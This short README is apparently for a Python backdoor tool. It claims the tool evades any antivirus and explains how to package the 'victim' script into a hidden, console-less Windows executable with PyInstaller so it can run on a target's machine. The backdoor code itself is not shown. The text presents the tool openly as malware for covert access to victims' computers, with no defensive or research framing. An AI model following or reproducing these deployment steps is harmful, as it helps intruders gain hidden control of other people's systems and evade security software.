# backdoor

it's a simple backdoor which bypasses any av 

make sure to convert the victim.py into victim.exe if the target doesn't dont have py installed 

goto cmd/terminal > pip install pyinstall 

syntax : pyinstaller victim.py -F --noconsole (this converts py to exe)

now the vict.exe will be in dist dir
